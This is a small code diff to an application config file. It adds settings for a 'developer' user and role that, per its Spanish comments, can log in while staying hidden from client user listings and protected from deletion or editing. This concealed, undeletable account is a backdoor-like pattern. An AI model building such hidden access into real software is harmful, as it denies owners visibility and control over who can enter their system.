@@ -20,6 +20,12 @@ export const config = {
   // Features
   isProduction: process.env.NODE_ENV === 'production',
   isDevelopment: process.env.NODE_ENV === 'development',
+
+  // Sistema Desarrollador (oculto para clientes)
+  // El usuario y rol de desarrollador pueden hacer login pero NO aparecen en listados,
+  // NO pueden ser eliminados ni editados por otros usuarios.
+  devEmail: process.env.DEV_EMAIL || 'desarrollador@dev',
+  devRoleName: 'Desarrollador',
 };
 
 // Validar variables requeridas
